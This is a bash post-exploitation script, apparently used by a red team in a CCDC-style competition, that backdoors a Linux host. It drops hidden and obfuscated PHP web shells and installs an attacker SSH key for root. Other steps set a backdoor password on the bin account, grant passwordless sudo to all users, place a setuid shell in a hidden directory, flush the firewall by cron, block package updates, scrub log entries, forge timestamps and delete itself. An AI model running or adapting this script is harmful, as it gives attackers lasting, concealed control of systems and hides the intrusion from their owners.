#!/bin/bash

## Big script harvested from a previous CCDC team a while back.  Not to be shared per the author.

SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMiZUfIB5MpUh1U0U19TpNSAKJRBBQSiC2s8KUY6wOiQx0qm68/qP0hNdu+QdjRFcTvHV4zUJjA7ShrZXbLt+bztBgb5d/x8yaHrn8RTZMMKTC5Cy1NnT/GcL6yZaoQuH9+hT4FS6cA3ivaVkMKlCrac2bJoK6ho0ncl70KtGnKXRvKbfs0I3sfUSv/Yv9YBCmhw7CE6poFhqzJl+Mty6FGmxn7QnaOjo4YoGIuUkZh7IA3zsPb2SEvzBiMlKaVDPWGJSIOGJCvF/4hxFJAKWY3iWQqGaK/DrIgRr0N0T/AMSLngtPL1sPlV02vdni6WBHSG8jAoGX6mfQ1iuWh8TT"

do_web_backdoors() {
  # Detect apache directory, if running
	if [ -d "/etc/nginx" ]; then
		>&2 echo "nginx detected"
		#NGINXROOT=$(grep -r 'root' /etc/nginx | grep conf | grep " root \/" | awk '{print $3}' | tr -d ';')
		NGINXROOT=$(grep -r 'root' /etc/nginx/ 2>&- | grep "root .*;" | grep -v ":#" | awk '{print $3}' | sed 's/;//g')
	fi
	if [ -d "/etc/apache2" ] || [ -d "/etc/httpd" ]; then
		>&2 echo "apache2 detected"
		#APACHEROOT=$(grep -r 'DocumentRoot' /etc | grep conf | grep "^DocumentRoot" | awk -F"\"" '{print $2}')
		APACHEROOT=$(grep -r 'DocumentRoot' /etc/ 2>&- | grep conf | grep DocumentRoot | awk '{print $3}' | head -n 1)
	fi

	>&2 echo "Deploying web shells"
	if [ -n "${NGINXROOT}" ]; then
		# drop classic webshells
		echo '<?php echo shell_exec($_GET['e']); ?>' > "$NGINXROOT/.s.php"
		echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > "$NGINXROOT/.src.php"
		chmod 444 "$NGINXROOT/.s.php"
		## Needs touch -r trick
		chmod 444 "$NGINXROOT/.src.php"
		## Needs touch -r trick
	fi
	if [ -n "${APACHEROOT}" ]; then
		# drop classic webshells
		echo '<?php echo shell_exec($_GET['e']); ?>' > "$APACHEROOT/.s.php"
		echo '<?php $b=strrev("edoced_4"."6esab");eval($b(str_replace(" ","","a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "))); ?>' > "$APACHEROOT/.src.php"
		chmod 444 "$APACHEROOT/.s.php"
		## Needs touch -r trick
		chmod 444 "$APACHEROOT/.src.php"
		## Needs touch -r trick
	fi
	# Just in case
	if [ -d "/var/www" ]; then
		echo '<?php echo shell_exec($_GET['e']); ?>' > "/var/www/.s.php"
		## Needs touch -r trick
	fi
	if [ -d "/var/www/html" ]; then
		echo '<?php echo shell_exec($_GET['e']); ?>' > "/var/www/html/.s.php"
		## Needs touch -r trick
	fi
}

do_backdoors() {
	>&2 echo "Deploying backdoors"
	# removing utmp
	rm -rf /var/run/utmp
	touch /var/run/utmp
	chmod 664 /var/run/utmp

	# installing root ssh key
	if [ ! -d "/root/.ssh" ]; then
		mkdir /root/.ssh
	fi
	echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys
	chattr +i /root/.ssh/authorized_keys
		## Needs touch -r trick

	# add secondary key auth file, for when they inevitably remove /root/.ssh/
	echo $SHARED_PUBKEY >> /etc/ssh/authorized_keys
	echo 'AuthorizedKeysFile /etc/ssh/authorized_keys' >> /etc/ssh/sshd_config
	chattr +i /etc/ssh/authorized_keys
		## Needs touch -r trick

	# iptables crontab shenanigans
	>&2 echo "adding 5m disable iptables crontab.."
	echo "*/5 * * * * /sbin/iptables -F" | crontab -

	# backdoor bin account pass=lol123
	sed -i -e 's/bin:\*:/bin:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
  # usermod -s /bin/sh bin
	cp /bin/bash "/sbin/nologin "
	usermod -s "/sbin/nologin " bin

	# make privesc easy via all service accounts via sudoers
	echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
	echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/README
	touch -r /etc/issue * /etc/sudoers.d/README
	touch -r /etc/issue * /etc/passwd
	touch -r /etc/issue * /etc/sudoers
	groupadd admin 2> /dev/null

	# take care of logs, ie 'groupadd[31001]: new group: name=admin, GID=1005' in auth.log
	sed -ie "/groupadd/d" /var/log/auth.log /var/log/messages /var/log/secure 2> /dev/null

	# ubuntu automatically makes members of admin have sudo capabilities.
	# lets give that as an option for root to web backdoors
	usermod -G admin -a bin 2> /dev/null
	usermod -G admin -a www-data 2> /dev/null
	usermod -G admin -a httpd 2> /dev/null
	usermod -G admin -a apache 2> /dev/null

	# take care of logs, ie 'usermod[31005]: add 'bin' to group 'admin'
	sed -ie "/usermod/d" /var/log/auth.log /var/log/messages /var/log/secure 2> /dev/null

	# drop setuid /bin/sh for use with bin account & privesc
	if [ ! -d "/dev/  " ]; then
		mkdir "/dev/  "
	fi
	cp /bin/sh "/dev/  /pwnd"
	chmod 777 "/dev/  /pwnd"
	chown root:root "/dev/  /pwnd"
	chmod u+s "/dev/  /pwnd"
	touch -r /etc/issue * "/dev/  /pwnd"
	touch -r /etc/issue * "/dev/  /"

	# clear log entries with our IP
	sed -ie "/passwd/d" /var/log/auth.log /var/log/messages /var/log/secure 2> /dev/null
	sed -ie "/Accepted password for bin/d" /var/log/auth.log /var/log/messages /var/log/secure 2> /dev/null         
	sed -ie "/Accepted password for root/d" /var/log/auth.log /var/log/messages /var/log/secure 2> /dev/null

	# prevent all package upgrades on fedora/centos
	# all yum'ing results in "Nothing to do."
	if [ -f "/etc/yum.conf" ]; then
		echo 'exclude=*' >> /etc/yum.conf
		touch -r /etc/issue /etc/yum.conf
	fi

	# block all kernel package upgrades on ubuntu/debian
	# all apt-get use will result in "<package> has no installation candidate"
#	if [ -d "/etc/apt/preferences.d" ]; then
#		echo "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
#		# blend in
#		touch -r /etc/issue * /etc/apt/preferences.d/*
#		touch -r /etc/issue * /etc/apt
#		touch -r /etc/issue * /etc/apt/*
#	fi
#	if [ -f "/etc/apt/preferences" ]; then
#		echo "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
#		touch -r /etc/issue * /etc/apt
#		touch -r /etc/issue * /etc/apt/*
#	fi
#
#	# prevent kernel package from being included in the autoupgrade in ubuntu
#	if [ -f "/etc/apt/apt.conf.d/01autoremove" ]; then
#		sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
#		touch -r /etc/issue * /etc/apt/apt.conf.d/*
#		touch -r /etc/issue * /etc/apt
#		touch -r /etc/issue * /etc/apt/*
#	fi

	>&2 echo "Backdoors done."
}

do_backdoors
do_web_backdoors

>&2 echo "Ready to go, enjoy"
NAME="$(basename $0)"
if [ $NAME != "sh" ];then
	rm -- "$(basename $0)"
fi
